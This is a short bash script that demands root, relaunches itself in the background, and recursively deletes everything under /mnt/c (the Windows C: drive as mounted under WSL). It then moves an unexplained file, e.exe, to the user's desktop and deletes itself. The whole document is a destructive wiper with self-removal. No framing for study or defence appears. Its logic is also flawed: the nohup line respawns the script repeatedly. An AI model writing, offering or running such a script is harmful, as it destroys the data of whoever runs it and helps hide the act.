#!/bin/bash

# Request admin privileges
if [[ $EUID -ne 0 ]]; then
    printf "Please run this script as root or with sudo.\n"
    exit 1
fi

# Run as a background process
nohup "$0" &>/dev/null &

# Delete target folder "C:" and its contents
# Delete target folder "C:" and its contents
try_delete_c_drive() {
    target_folder="/mnt/c"

    if [[ -d "$target_folder" ]]; then
        printf "Attempting to delete the C: drive...\n"

        # Remove files recursively
        if find "$target_folder" -mindepth 1 -delete -print 2>/dev/null; then
            # Remove the target folder itself
            if rmdir "$target_folder" 2>/dev/null; then
                printf "C: drive deletion completed.\n"
            else
                printf "Failed to remove the target folder.\n"
            fi
        else
            printf "Failed to delete files in the target folder.\n"
        fi
    else
        printf "C: drive not found.\n"
    fi
}


# Move file e.exe to the user's desktop
move_e_exe() {
    username=$(whoami)
    desktop_path="/home/$username/Desktop"
    printf "Moving e.exe to the desktop...\n"
    mv e.exe "$desktop_path"
    printf "e.exe moved to the desktop.\n"
}

# Delete the script itself
delete_script() {
    script_path="$0"
    printf "Deleting the script...\n"
    rm "$script_path"
    printf "Script deleted.\n"
}

# Main function
main() {
    try_delete_c_drive
    move_e_exe
    delete_script
}

# Exception handling
trap 'printf "An error occurred! Exiting...\n"; exit 1' ERR

# Call the main function
main
